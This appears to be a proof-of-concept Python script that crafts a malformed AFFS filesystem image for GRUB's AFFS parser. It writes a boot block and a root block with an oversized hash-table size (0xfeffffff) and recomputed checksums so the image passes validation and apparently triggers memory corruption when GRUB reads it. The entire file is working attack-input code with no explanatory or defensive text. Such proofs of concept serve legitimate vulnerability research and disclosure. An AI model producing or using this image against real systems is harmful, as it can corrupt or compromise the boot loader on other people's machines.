#from pwn import *
import struct

fname = "tst.affs"

SEC_SZ = 0x200
SEC_BITS = 9

def p32(i):
    return struct.pack("I",i)
def u32(i):
    return struct.unpack("I",i)[0]
def flat(arg):
    fini = b""
    for x in arg:
        fini += x
    return fini

def fill_sec(currbuf, numsec = 1,secsz=SEC_SZ, char = b"A"):
    return (char * ((secsz * numsec) - len(currbuf)))
def fill_sz(currbuf, sz, char = b"A"):
    return currbuf + (char * (sz - len(currbuf)))
## Bswaps before adding
def do_checksum(data):
    chksum = 0;
    n = 0;
    i = 0
    while (i < len(data)):
        n = data[i:i+4]
        chksum += u32(n[::-1])
        chksum %= 2**32
        print("dat -> " + hex(u32(n)) +", curr sum -> " +  hex(chksum))
        i += 4

    data += p32(0x100000000 - chksum - 1)[::-1]
    return data


#struct grub_affs_rblock {
#	/* typedef grub_uint32_t */ unsigned int               type;                     /*     0     4 */
#	/* typedef grub_uint8_t */ unsigned char              unused1[8];                /*     4     8 */
#	/* typedef grub_uint32_t */ unsigned int               htsize;                   /*    12     4 */
#	/* typedef grub_uint32_t */ unsigned int               unused2;                  /*    16     4 */
#	/* typedef grub_uint32_t */ unsigned int               checksum;                 /*    20     4 */
#	/* typedef grub_uint32_t */ unsigned int               hashtable[1];             /*    24     4 */
#
#	/* size: 28, cachelines: 1, members: 6 */
#	/* last cacheline: 28 bytes */
#};
grub_affs_rblock = flat([
    p32(0x2)[::-1],
    p32(0xfeffffff)*2,
    p32(1)[::-1],
    p32(0xcccccccc),
    p32(0x41414141),
    ])
grub_affs_rblock = fill_sz(grub_affs_rblock, ((SEC_SZ) * 1 - 4)-4, char=b"\x00")
grub_affs_rblock = do_checksum(grub_affs_rblock)

grub_affs_rblock += p32(1)[::-1]

#struct grub_affs_bblock {
#	/* typedef grub_uint8_t */ unsigned char              type[3];                   /*     0     3 */
#	/* typedef grub_uint8_t */ unsigned char              flags;                     /*     3     1 */
#	/* typedef grub_uint32_t */ unsigned int               checksum;                 /*     4     4 */
#	/* typedef grub_uint32_t */ unsigned int               rootblock;                /*     8     4 */
#
#	/* size: 12, cachelines: 1, members: 4 */
#	/* last cacheline: 12 bytes */
#};
grub_affs_bblock = flat([
    b"DOS",
    b"A",
    p32(0xfffffffe)[::-1],
    ## Specify sector to start looking in
    p32(1)[::-1],
    ])



def main():
    buf = grub_affs_bblock
    buf += fill_sec(buf);
    buf += grub_affs_rblock
    f = open(fname, "wb")
    f.write(buf)
    f.close()


if __name__ == "__main__":
    main()






